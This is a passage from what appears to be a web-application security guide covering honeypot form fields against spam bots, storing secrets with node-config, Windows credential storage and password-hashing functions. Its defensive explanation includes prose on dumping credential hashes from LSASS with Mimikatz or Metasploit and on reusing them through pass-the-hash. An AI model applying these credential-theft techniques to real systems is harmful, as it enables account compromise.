  <li>Services like Akismet and Mollom which take user input and analyse for spam signatures. Mollom sometimes presents a captcha if it is unsure. These two services learn from their mistakes if they mark something as spam and you unmark it, but of course you are going to have to be watching for that. Matt Mullenweg created Akismet so that his mother could blog in safety. “<em>His first attempt was a JavaScript plugin which modified the comment form and hid fields, but within hours of launching it, spammers downloaded it, figured out how it worked, and bypassed it. This is a common pitfall for anti-spam plugins: once they get traction</em>”. My advice to this is not to use a common plugin, but to create something custom. I discuss this soon.</li>
</ul>

<p>The above solutions are excellent targets for creating exploits that will have a large pay off due to the fact that so many websites are using them. There are exploits discovered for these services regularly.</p>

<h5 id="leanpub-auto-still-not-cutting-it">Still Not Cutting it</h5>

<p>“<em>Given the fact that many clients count on conversions to make money, not receiving 3.2% of those conversions could put a dent in sales.  Personally, I would rather sort through a few SPAM conversions instead of losing out on possible income.</em>”</p>

<blockquote>
  <p>Casey Henry: <a href="https://moz.com/blog/captchas-affect-on-conversion-rates">Captchas’ Effect on Conversion Rates</a></p>
</blockquote>

<p>“<em>Spam is not the user’s problem; it is the problem of the business that is providing the website. It is arrogant and lazy to try and push the problem onto a website’s visitors.</em>”</p>

<blockquote>
  <p>Tim Kadlec: <a href="http://timkadlec.com/2011/01/death-to-captchas/">Death to Captchas</a></p>
</blockquote>

<h5 id="leanpub-auto-user-time-expenditure">User Time Expenditure</h5>

<p>Recording how long it takes from fetch to submit. This is another technique, in which the time is measured from fetch to submit. For example if the time span is under five seconds it is more than likely a bot, so handle the message accordingly.</p>

<h5 id="leanpub-auto-bot-pot">Bot Pot</h5>

<p>Spamming bots operating on custom mechanisms will in most cases just try, then move on. If you decide to use one of the common offerings from above, exploits will be more common, depending on how wide spread the offering is. This is one of the cases where going custom is a better option. Worse case is you get some spam and you can modify your technique, but you get to keep things simple, tailored to your web application, your users needs, no external dependencies and no monthly fees. This is also the simplest technique and requires very little work to implement.</p>

<p>Spam bots:</p>

<ul>
  <li>Love to populate form fields</li>
  <li>Usually ignore CSS. For example, if you have some CSS that hides a form field and especially if the CSS is not inline on the same page, they will usually fail at realising that the field is not supposed to be visible.</li>
</ul>

<p>So what we do is create a field that is not visible to humans and is supposed to be kept empty. On the server once the form is submitted, we check that it is still empty. If it is not, then we assume a bot has been at it.</p>

<p>This is so simple, does not get in the way of your users, yet very effective at filtering bot spam.</p>

<p>Client side:</p>

<figure class="code">
  <figcaption>CSS</figcaption>

<div class="highlight"><pre><code></code><code class="nt">form</code> <code class="p">.</code><code class="nc">bot-pot</code> <code class="p">{</code>
   <code class="k">display</code><code class="p">:</code> <code class="kc">none</code><code class="p">;</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>HTML</figcaption>

<div class="highlight"><pre><code></code><code class="p">&lt;</code><code class="nt">form</code><code class="p">&gt;</code>
   <code class="c">&lt;!--...--&gt;</code>
   <code class="p">&lt;</code><code class="nt">div</code><code class="p">&gt;&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"text"</code> <code class="na">name</code><code class="o">=</code><code class="s">"bot-pot"</code> <code class="na">class</code><code class="o">=</code><code class="s">"bot-pot"</code><code class="p">&gt;&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
   <code class="c">&lt;!--...--&gt;</code>
<code class="p">&lt;/</code><code class="nt">form</code><code class="p">&gt;</code>
</pre></div>

</figure>

<p>Server side:</p>

<p>This is also shown above in a larger example in the <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs">Lack of Input Validation, Filtering and Sanitisation</a> section. I show the validation code middle ware of the route on line 28 below. The validation is performed on line 14</p>

<figure class="code">
  <figcaption>routes/home.js</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="c1">//...</code>
<code class="lineno"> 2 </code>
<code class="lineno"> 3 </code><code class="kd">function</code> <code class="nx">home</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 4 </code>  <code class="nx">res</code><code class="p">.</code><code class="nx">redirect</code><code class="p">(</code><code class="s1">'/'</code><code class="p">);</code>
<code class="lineno"> 5 </code><code class="p">}</code>
<code class="lineno"> 6 </code>
<code class="lineno"> 7 </code><code class="kd">function</code> <code class="nx">index</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 8 </code>   <code class="nx">res</code><code class="p">.</code><code class="nx">render</code><code class="p">(</code><code class="s1">'home'</code><code class="p">,</code> <code class="p">{</code> <code class="nx">title</code><code class="o">:</code> <code class="s1">'Home'</code><code class="p">,</code> <code class="nx">id</code><code class="o">:</code> <code class="s1">'home'</code><code class="p">,</code> <code class="nx">brand</code><code class="o">:</code> <code class="s1">'your brand'</code> <code class="p">});</code>
<code class="lineno"> 9 </code><code class="p">}</code>
<code class="lineno">10 </code>
<code class="lineno">11 </code><code class="kd">function</code> <code class="nx">validate</code><code class="p">()</code> <code class="p">{</code>
<code class="lineno">12 </code>   <code class="k">return</code> <code class="nx">form</code><code class="p">(</code>
<code class="lineno">13 </code>      <code class="c1">// Bots love to populate everything.</code>
<code class="lineno">14 </code>      <code class="nx">fieldToValidate</code><code class="p">(</code><code class="s1">'bot-pot'</code><code class="p">).</code><code class="nx">maxLength</code><code class="p">(</code><code class="mi">0</code><code class="p">)</code>
<code class="lineno">15 </code>   <code class="p">);</code>
<code class="lineno">16 </code><code class="p">}</code>
<code class="lineno">17 </code>
<code class="lineno">18 </code><code class="kd">function</code> <code class="nx">contact</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">19 </code>   
<code class="lineno">20 </code>   <code class="k">if</code><code class="p">(</code><code class="nx">req</code><code class="p">.</code><code class="nx">form</code><code class="p">.</code><code class="nx">isValid</code><code class="p">)</code>
<code class="lineno">21 </code>      <code class="c1">// We know the bot-pot is of zero length. So no bots.</code>
<code class="lineno">22 </code>   <code class="c1">//...</code>
<code class="lineno">23 </code><code class="p">}</code>
<code class="lineno">24 </code>
<code class="lineno">25 </code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">app</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">26 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'/'</code><code class="p">,</code> <code class="nx">index</code><code class="p">);</code>
<code class="lineno">27 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'/home'</code><code class="p">,</code> <code class="nx">home</code><code class="p">);</code> 
<code class="lineno">28 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">post</code><code class="p">(</code><code class="s1">'/contact'</code><code class="p">,</code> <code class="nx">validate</code><code class="p">(),</code> <code class="nx">contact</code><code class="p">);</code>
<code class="lineno">29 </code><code class="p">};</code>
</pre></div>

</figure>

<p>So as you can see, a very simple solution. You could even consider combining the above two techniques.</p>

<h5 id="leanpub-auto-testing">Testing</h5>

<p> </p>

<p>Check out the “Testing for Captcha (OWASP-AT-008” in v3 of the OWASP Testing Guide for summary and description of the issue and testing examples. The Offensive Web Testing Framework (OWTF) also has a <a href="https://github.com/owtf/owtf/wiki/Listing-Plugins">plugin</a> for it.</p>

<h4 id="web-applications-countermeasures-management-of-application-secrets">Management of Application Secrets</h4>

<p>Secure password management within applications is a case of doing what you can, often relying on obscurity and leaning on other layers of defence to make it harder for compromise. Like many of the layers already discussed in the previous chapters. Review the <a href="chap05.html#cloud-countermeasures-storage-of-secrets">Storage of Secrets</a> subsections in the Cloud chapter for some ideas and tooling options to help with this.</p>

<p>Find out how secret the data that is supposed to be secret that is being sent over the network actually is and consider your internal network just as malicious as the internet. Then you will be starting to get the idea of what defence in depth is about. That way when one defence breaks down, you will still be in good standing.</p>


<img src="images/DefenceInDepth.png" alt="Defence In Depth"/>


<p>You may read in many places that having data-store passwords and other types of secrets in configuration files in clear text is an insecurity that <a href="https://www.owasp.org/index.php/Password_Plaintext_Storage">must be addressed</a>. Then when it comes to mitigation, there seems to be a few techniques for helping, but most of them are based around obscuring the secret rather than securing it. Essentially just making discovery a little more inconvenient like using an alternative port to SSH to other than the default of 22. Maybe surprisingly though, obscurity does significantly reduce the number of opportunistic type attacks from bots and script kiddies.</p>

<h5 id="web-applications-countermeasures-management-of-application-secrets-store-configuration">Store Configuration in Configuration files</h5>

<img class="threat-tags" src="images/ThreatTags----PreventionAVERAGE.png"/>


<p>Do not hard code passwords in source files for all developers to see. Doing so also means the code has to be patched when services are breached. At the very least, store them in configuration files and use different configuration files for different deployments and consider keeping them out of source control.</p>

<p>Here are some examples using the node-config module.</p>

<h6 id="leanpub-auto-node-config">node-config</h6>

<p>is a fully featured, well maintained configuration package that I have used on a good number of projects.</p>

<p>To install: From the command line within the root directory of your NodeJS application, run:</p>

<p>
  <code>npm install node-config --save</code>
</p>

<p>Now you are ready to start using node-config. An example of the relevant section of an <code>app.js</code> file may look like the following:</p>

<figure class="code">
  <figcaption>app.js</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Due to bug in node-config the if statement is required before config is required</code>
<code class="c1">// https://github.com/lorenwest/node-config/issues/202</code>
<code class="k">if</code> <code class="p">(</code><code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_ENV</code> <code class="o">===</code> <code class="s1">'production'</code><code class="p">)</code>
   <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_CONFIG_DIR</code> <code class="o">=</code> <code class="nx">path</code><code class="p">.</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">,</code> <code class="s1">'config'</code><code class="p">);</code>
</pre></div>

</figure>

<p>Where ever you use node-config, in your routes for example:</p>

<figure class="code">
  <figcaption>home.js</figcaption>

<div class="highlight"><pre><code></code><code class="kd">var</code> <code class="nx">config</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'config'</code><code class="p">);</code>
<code class="kd">var</code> <code class="nx">nodemailer</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'nodemailer'</code><code class="p">);</code>
<code class="kd">var</code> <code class="nx">enquiriesEmail</code> <code class="o">=</code> <code class="nx">config</code><code class="p">.</code><code class="nx">enquiries</code><code class="p">.</code><code class="nx">email</code><code class="p">;</code>

<code class="c1">// Setting up email transport.</code>
<code class="kd">var</code> <code class="nx">transporter</code> <code class="o">=</code> <code class="nx">nodemailer</code><code class="p">.</code><code class="nx">createTransport</code><code class="p">({</code>
   <code class="nx">service</code><code class="o">:</code> <code class="nx">config</code><code class="p">.</code><code class="nx">enquiries</code><code class="p">.</code><code class="nx">service</code><code class="p">,</code>
   <code class="nx">auth</code><code class="o">:</code> <code class="p">{</code>
      <code class="nx">user</code><code class="o">:</code> <code class="nx">config</code><code class="p">.</code><code class="nx">enquiries</code><code class="p">.</code><code class="nx">user</code><code class="p">,</code>
      <code class="nx">pass</code><code class="o">:</code> <code class="nx">config</code><code class="p">.</code><code class="nx">enquiries</code><code class="p">.</code><code class="nx">pass</code> <code class="c1">// App specific password.</code>
   <code class="p">}</code>
<code class="p">});</code>
</pre></div>

</figure>

<p>A good collection of different formats can be used for the config files: <code>.json</code>, <code>.json5</code>, <code>.hjson</code>, <code>.yaml</code>, <code>.js</code>, <code>.coffee</code>, <code>.cson</code>, <code>.properties</code>, <code>.toml</code></p>

<p>There is a specific <a href="https://github.com/lorenwest/node-config/wiki/Configuration-Files">file loading order</a> which you specify by file naming convention, which provides a lot of flexibility and which caters for:</p>

<ul>
  <li>Having multiple instances of the same application running on the same machine</li>
  <li>The use of short and full host names to mitigate machine naming collisions</li>
  <li>The type of deployment. This can be anything you set the <code>$NODE_ENV</code> environment variable to for example: <code>development</code>, <code>production</code>, <code>staging</code>, <code>whatever</code>.</li>
  <li>Using and creating config files which stay out of source control. These config files have a prefix of <code>local</code>. These files are to be managed by external configuration management tools, build scripts, etc. Thus providing even more flexibility about where your sensitive configuration values come from.</li>
</ul>

<div class="page-break"></div>
<p>The config files for the required attributes used above may take the following directory structure:</p>

<figure class="code">
  <figcaption>Directory layout</figcaption>

<div class="highlight"><pre><code></code><code class="nx">OurApp</code><code class="o">/</code>
<code class="o">|</code>
<code class="o">+--</code> <code class="nx">config</code><code class="o">/</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="k">default</code><code class="p">.</code><code class="nx">js</code> <code class="p">(</code><code class="nx">usually</code> <code class="nx">has</code> <code class="nx">the</code> <code class="nx">most</code> <code class="k">in</code> <code class="nx">it</code><code class="p">)</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="nx">devbox1</code><code class="o">-</code><code class="nx">development</code><code class="p">.</code><code class="nx">js</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="nx">devbox2</code><code class="o">-</code><code class="nx">development</code><code class="p">.</code><code class="nx">js</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="nx">stagingbox</code><code class="o">-</code><code class="nx">staging</code><code class="p">.</code><code class="nx">js</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="nx">prodbox</code><code class="o">-</code><code class="nx">production</code><code class="p">.</code><code class="nx">js</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="nx">local</code><code class="p">.</code><code class="nx">js</code> <code class="p">(</code><code class="nx">creted</code> <code class="nx">by</code> <code class="nx">build</code><code class="p">)</code>
<code class="o">|</code>
<code class="o">+--</code> <code class="nx">routes</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="nx">home</code><code class="p">.</code><code class="nx">js</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="p">...</code>
<code class="o">|</code>
<code class="o">+--</code> <code class="nx">clients</code>
<code class="o">|</code>  <code class="o">|</code>
<code class="o">|</code>  <code class="o">+--</code> <code class="p">...</code>
<code class="o">|</code>
<code class="o">+--</code> <code class="nx">app</code><code class="p">.</code><code class="nx">js</code> <code class="p">(</code><code class="nx">entry</code> <code class="nx">point</code><code class="p">)</code>
<code class="o">|</code>
<code class="o">+--</code> <code class="p">...</code>
</pre></div>

</figure>

<p>The contents of the above example configuration files may look like the following:</p>

<figure class="code">
  <figcaption>default.js</figcaption>

<div class="highlight"><pre><code></code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
   <code class="nx">enquiries</code><code class="o">:</code> <code class="p">{</code>
      <code class="c1">// Supported services:</code>
      <code class="c1">// https://github.com/andris9/nodemailer-wellknown#supported-services</code>
      <code class="c1">// supported-services actually use the best security settings by default.</code>
      <code class="c1">// I tested this with a wire capture, because it is always the most fool proof way.</code>
      <code class="nx">service</code><code class="o">:</code> <code class="s1">'FastMail'</code><code class="p">,</code>
      <code class="nx">email</code><code class="o">:</code> <code class="s1">'yourusername@fastmail.com'</code><code class="p">,</code>
      <code class="nx">user</code><code class="o">:</code> <code class="s1">'yourusername'</code><code class="p">,</code>
      <code class="nx">pass</code><code class="o">:</code> <code class="kc">null</code>
   <code class="p">}</code>
   <code class="c1">// Lots of other settings.</code>
   <code class="c1">// ...</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>devbox1-development.js</figcaption>

<div class="highlight"><pre><code></code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
   <code class="nx">enquiries</code><code class="o">:</code> <code class="p">{</code>
      <code class="c1">// Test password for developer on devbox1</code>
      <code class="nx">pass</code><code class="o">:</code> <code class="s1">'D[6F9,4fM6?%2ULnirPVTk#Q*7Z+5n'</code> <code class="c1">// App specific password.</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>devbox2-development.js</figcaption>

<div class="highlight"><pre><code></code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
   <code class="nx">enquiries</code><code class="o">:</code> <code class="p">{</code>
      <code class="c1">// Test password for developer on devbox2</code>
      <code class="nx">pass</code><code class="o">:</code> <code class="s1">'eUoxK=S9&lt;,`@m0T1=^(EZ#61^5H;.H'</code> <code class="c1">// App specific password.</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>stagingbox-staging.js</figcaption>

<div class="highlight"><pre><code></code><code class="p">{}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>prodbox-production.js</figcaption>

<div class="highlight"><pre><code></code><code class="p">{}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>local.js</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Build creates this file.</code>
<code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
   <code class="nx">enquiries</code><code class="o">:</code> <code class="p">{</code>
      <code class="c1">// Password created by the build.</code>
      <code class="nx">pass</code><code class="o">:</code> <code class="s1">'10lQu$4YC&amp;x~)}lUF&gt;3pm]Tk&gt;@+{N]'</code> <code class="c1">// App specific password.</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p>The <a href="chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-logging">Logging</a> section shows more configuration options to provide a slightly bigger picture.</p>

<p>node-config also:</p>

<ul>
  <li>Provides command line overrides, thus allowing you to override configuration values at application start from command</li>
  <li>Allows for the overriding of environment variables with <a href="https://github.com/lorenwest/node-config/wiki/Environment-Variables#custom-environment-variables">custom environment variables</a> from a <code>custom-environment-variables.json</code> file</li>
</ul>

<p> </p>

<p>Encrypting/decrypting credentials in code may provide some obscurity, but not much more than that.<br />
There are different answers for different platforms. None of which provide complete security, if there is such a thing, but instead focusing on different levels of obscurity.</p>

<h6 id="web-applications-countermeasures-management-of-application-secrets-store-configuration-windows">Windows</h6>

<p><strong>Store database credentials as a Local Security Authority (LSA) secret</strong> and create a DSN with the stored credential. Use a SqlServer <a href="https://www.owasp.org/index.php/Configuration#Secure_connection_strings">connection string</a> with <code>Trusted_Connection=yes</code></p>

<p>The hashed credentials are stored in the SAM file and the registry. If an attacker has physical access to the storage, they can easily copy the hashes if the machine is not running or can be shut-down. The hashes can be sniffed <a href="#network-identify-risks-wire-inspecting">from the wire</a> in transit. The hashes can be pulled from the running machines memory (specifically the Local Security Authority Subsystem Service (<code>LSASS.exe</code>)) using tools such as Mimikatz, WCE, Metasploits <a href="https://www.rapid7.com/db/modules/post/windows/gather/hashdump">hashdump</a> or fgdump.</p>

<p>The <code>NTDS.dit</code> database file, along with the DBLayer that is running inside the NTDSAI.DLL (DSA), is directly managed by the Extensible Storage Engine (ESE), which tries to read as much as possible into the <code>LSASS.exe</code> memory. </p>

<p>An attacker generally only needs the hash. Trusted tools like psexec (as we <a href="chap03.html#vps-identify-risks-windows-pth-suite-of-metasploit-modules">discussed in the VPS chapter</a>) take care of this for us. Also discussed in my <a href="https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com">“0wn1ng The Web”</a> presentation. </p>

<p> </p>

<p><strong>Encrypt sections</strong> of a web, executable, machine-level, application-level configuration files with <code>aspnet_regiis.exe</code> with the <code>-pe</code> option and name of the configuration element to encrypt and the configuration provider you want to use. Either <code>DataProtectionConfigurationProvider</code> (uses DPAPI) or <code>RSAProtectedConfigurationProvider</code> (uses RSA). the <code>-pd</code> switch is used to decrypt or programatically:<br />
<code>string connStr = ConfigurationManager.ConnectionString["MyDbConn1"].ToString();</code></p>

<p>Of course there is a problem with this also. DPAPI uses LSASS, which again an attacker can extract the hash from its memory. If the <code>RSAProtectedConfigurationProvider</code> has been used, a key container is required. Mimikatz will force an export from the key container to a <code>.pvk</code> file.
Which can then be <a href="http://stackoverflow.com/questions/7332722/export-snk-from-non-exportable-key-container">read</a> using OpenSSL or tools from the <code>Mono.Security</code> assembly.</p>

<p> </p>

<p>I have looked at a few other ways using <code>PSCredential</code> and <code>SecureString</code>. They all seem to rely on DPAPI which as mentioned uses LSASS which is open for exploitation.</p>

<p> </p>

<p><a href="https://technet.microsoft.com/en-us/library/mt483740"><strong>Credential Guard</strong></a> and Device Guard leverage virtualisation-based security. By the look of it still using LSASS. Bromium have partnered with Microsoft and coined it Micro-virtualization. The idea is that every user task is isolated into its own micro-VM. There seems to be some confusion as to how this is any better. Tasks still need to communicate outside of their VM, so what is to stop malicious code doing the same? I have seen lots of questions but no compelling answers yet. Credential Guard must run on physical hardware directly. Can not run on virtual machines. This alone rules out many deployments.</p>

<p>“<em>Bromium vSentry transforms information and infrastructure protection with a revolutionary new architecture that isolates and defeats advanced threats targeting the endpoint through web, email and documents</em>”</p>

<p>“<em>vSentry protects desktops without requiring patches or updates, defeating and
automatically discarding all known and unknown malware, and eliminating the need for costly remediation.</em>”</p>

<p>This is marketing talk. Please don’t take this literally.</p>

<p>“<em>vSentry empowers users to access whatever information they need from any network, application or website, without risk to the enterprise</em>”</p>

<p>“<em>Traditional security solutions rely on detection and often fail to block targeted attacks which use unknown “zero day” exploits. Bromium uses hardware enforced isolation to stop even “undetectable” attacks without disrupting the user.</em>”</p>

<blockquote>
  <p>Bromium</p>
</blockquote>

<p>“<em>With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use</em>”</p>

<blockquote>
  <p>Bromium</p>
</blockquote>

<p>These seem like bold claims.</p>

<p>Also worth considering is that Microsofts new virtualization-based security also relies on UEFI Secure Boot, which has been proven <a href="http://www.itworld.com/article/2707547/endpoint-protection/researchers-demo-exploits-that-bypass-windows-8-secure-boot.html">insecure</a>.</p>

<h6 id="leanpub-auto-linux">Linux</h6>

<p><strong>Containers</strong> also help to provide some form of isolation. Allowing you to only have the user accounts to do what is necessary for the application.</p>

<p>I usually use a <strong>deployment tool that also changes the permissions</strong> and ownership of the files involved with the running web application to a single system user, so unprivileged users can not access the web applications files at all. The <a href="https://github.com/binarymist/DeploymentTool">deployment script</a> is executed over SSH in a remote shell. Only specific commands on the server are allowed to run and a very limited set of users have any sort of access to the machine. If you are using Linux or Docker Containers then you can reduce this even more if it is not already.</p>

<p>One of the beauties of GNU/Linux is that you can have as much or little security as you decide. No one has made that decision for you already and locked you out of the source. You are not feed lies like all of the closed source OS vendors trying to pimp their latest money spinning product. GNU/Linux is a dirty little secrete that requires no marketing hype. It just provides complete control if you want it. If you do not know what you want, then someone else will probably take that control from you. It is just a matter of time if it hasn’t happened already.</p>

<h5 id="web-applications-countermeasures-management-of-application-secrets-least-privilege">Least Privilege</h5>

<img class="threat-tags" src="images/ThreatTags----PreventionEASY.png"/>


<p>An application should have the least privileges possible in order to carry out what it needs to do. Consider creating accounts for each trust distinction. For example where you only need to read from a data store, then create that connection with a users credentials that is only allowed to read, and so on for other privileges. This way the attack surface is minimised. Adhering to the principle of least privilege. Also consider removing table access completely from the application and only provide permissions to the application to run stored queries. This way if/when an attacker is able to compromise the machine and retrieve the password for an action on the data-store, they will not be able to do a lot anyway.</p>

<h5 id="leanpub-auto-location">Location</h5>

<img class="threat-tags" src="images/ThreatTags----PreventionEASY.png"/>


<p>Put your services like data-stores on network segments that are as <a href="chap04.html#network-countermeasures-lack-of-segmentation">sheltered</a> as possible and only contain similar services.</p>

<p>Maintain as few user accounts on the servers in question as possible and with the least privileges as possible. </p>

<h5 id="web-applications-countermeasures-data-store-compromise">Data-store Compromise</h5>

<img class="threat-tags" src="images/ThreatTags----PreventionEASY.png"/>


<p>As part of your defence in depth strategy, you should expect that your data-store is going to get stolen, but hope that it does not. What assets within the data-store are sensitive? How are you going to stop an attacker that has gained access to the data-store from making sense of the sensitive data?</p>

<p>As part of developing the application that uses the data-store, a strategy also needs to be developed and implemented to carry on business as usual when this happens. For example, when your detection mechanisms realise that someone unauthorised has been on the machine(s) that host your data-store, as well as the usual alerts being fired off to the people that are going to investigate and audit, your application should take some automatic measures like:</p>

<ul>
  <li>All following logins should be instructed to change passwords</li>
</ul>

<p>If you follow the recommendations below, data-store theft alone will be an inconvenience, but not a disaster.</p>

<p>Consider what sensitive information you really need to store. Consider using the following key derivation functions (KDFs) for all sensitive data. Not just passwords. Also continue to <a href="https://speakerdeck.com/binarymist/passwords-lol">remind your customers</a> to always use unique passwords that are made up of alphanumeric, upper-case, lower-case and special characters. It is also worth considering pushing the use of high quality password vaults. Do not limit password lengths. Encourage long passwords.</p>

<p>PBKDF2, bcrypt and <a href="http://www.tarsnap.com/scrypt.html">scrypt</a> are KDFs that are designed to be slow. Used in a process commonly known as key stretching. The process of key stretching in terms of how long it takes can be tuned by increasing or decreasing the number of cycles used. Often 1000 cycles or more for passwords. “<em>The function used to protect stored credentials should balance attacker and defender verification. The defender needs an acceptable response time for verification of users’ credentials during peak use. However, the time required to map</em> <code>&lt;credential&gt; -&gt; &lt;protected form&gt;</code> <em>must remain beyond threats’ hardware (GPU, FPGA) and technique (dictionary-based, brute force, etc) capabilities.</em>”</p>

<blockquote>
  <p>OWASP Password Storage</p>
</blockquote>

<p>PBKDF2, bcrypt and the newer scrypt, apply a Pseudorandom Function (PRF) such as a cryptographic hash, cipher or keyed-Hash Message Authentication Code (HMAC) to the data being received along with a unique salt. The salt should be stored with the hashed data.</p>

<p>Do not use MD5, SHA-1 or the SHA-2 family of cryptographic one-way hashing functions by themselves for cryptographic purposes like hashing your sensitive data. In-fact do not use hashing functions at all for this unless they are leveraged with one of the mentioned KDFs. Why? Because they were not designed for passwords (to be slow), the hashing speed can not be slowed as hardware continues to get faster. Many organisations that have had their data-stores stolen and continue to on a weekly basis could avoid their secrets being compromised simply by using a decent KDF with salt and a decent number of iterations.
“<em>Using four AMD Radeon HD6990 graphics cards, I am able to make about 15.5 billion guesses per second using the SHA-1 algorithm.</em>”</p>

<blockquote>
  <p>Per Thorsheim</p>
</blockquote>

<p>In saying that, PBKDF2 can use MD5, SHA-1 and the SHA-2 family of hashing functions. Bcrypt uses the Blowfish (more specifically the Eksblowfish) cipher. Scrypt does not have user replaceable parts like PBKDF2. The PRF can not be changed from SHA-256 to something else.</p>

<h6 id="web-applications-countermeasures-data-store-compromise-which-kdf-to-use">Which KDF to use?</h6>

<p>This depends on many considerations. I am not going to tell you which is best, because there is no best. Which to use depends on many things. You should gain understanding into at least all three of the following best of breed KDFs often used for password hashing.</p>

<p><strong>PBKDF2</strong> is the oldest so it is the most battle tested, but there has also been lessons learnt from it that have been taken to the latter two, like the fact that its utilised hashing functions (MD5, SHA) are CPU intensive only and easily parallelised on GPUs and Application Specific Integrated Circuts, using very little RAM, we see this in crypto-currency mining.</p>

<p>The next oldest is <strong>bcrypt</strong> which uses the Eksblowfish cipher, which was designed specifically for bcrypt from the blowfish cipher, to be very slow to initiate thus boosting protection against dictionary attacks which were often run on custom Application-specific Integrated Circuits (ASICs) with low gate counts, often found in GPUs of the day (1999).<br />
The hashing functions that PBKDF2 uses were a lot easier to get speed increases on GPUs due to ease of parallelisation as opposed to the Eksblowfish cipher attributes such as:</p>

<ol class="numeric">
  <li>Far greater memory required for each hash</li>
  <li>Small and frequent pseudo-random memory accesses and modifications, making it harder to cache the data into faster memory and breaking parallelisation on GPUs.</li>
</ol>

<p>GPUs are good at carrying out the exact same instruction set concurrently, but when a branch in the logic occurs (which is how the blowfish algorithm works) on one of the sets, all others stop thus destroying parallelisation on GPUs.</p>

<p>The Arithmetic Logic Units (ALUs), or shaders of a GPU are partitioned into groups, and each group of ALUs shares management, so members of the group cannot be made to work on separate tasks. They can either all work on nearly identical variations of one single task, in perfect sync with one another, or nothing at all.</p>

<p>Bcrypt was specifically designed to be non GPU friendly, this is why it used the existing blowfish cipher.</p>

<p>Now with hardware utilising large Field-programmable Gate Arrays (FPGAs), bcrypt brute-forcing is becoming more accessible due to easily obtainable cheap hardware such as the <a href="http://www.extremetech.com/extreme/184828-intel-unveils-new-xeon-chip-with-integrated-fpga-touts-20x-performance-boost">Xeon+FPGA</a>. We also have the likes of the <a href="http://www.extremetech.com/extreme/133541-intels-64-core-champion-in-depth-on-xeon-phi">Xeon Phi</a> which has 60 1GHz cores (- several used by the system), each with 4 hardware threads. The Phi is pretty close to being a general purpose, many core CPU. The FPGAs are not easy to programme for and neither is the Xeon Phi, as it has its own embedded Linux SOC which runs BusyBox, that you need to SSH into. The following board and chip are also worth considering, although you won’t get the brute-forcing throughput of the Xeon+FPGA or Phi:</p>

<ul>
  <li><a href="http://picozed.org/product/zedboard">ZedBoard / Zynq 7020</a></li>
  <li><a href="http://www.theplatform.net/2015/06/02/intel-finishes-haswell-xeon-e5-rollout-launches-broadwell-e3/">Haswell</a></li>
</ul>

<p><strong>Scrypt</strong> uses PBKDF2-HMAC-SHA-256 (PBKDF2 of HMAC-SHA256) as its PRF, and 
the <a href="https://tools.ietf.org/html/rfc7914">Salsa20/8</a> core function, which is not a cryptographic hash function as it is not collision resistant, to help make pseudo-random writes to RAM, then repeatedly read them in a pseudo-random sequence, FPGAs do not generally have a lot of RAM, so this makes leveraging both FPGAs and GPUs a lot less feasible, thus narrowing down the field of potential hardware cracking options to many core multi-purpose CPUs, such as the Xeon Phi, ZedBoard, Haswell and others. </p>

<p> </p>

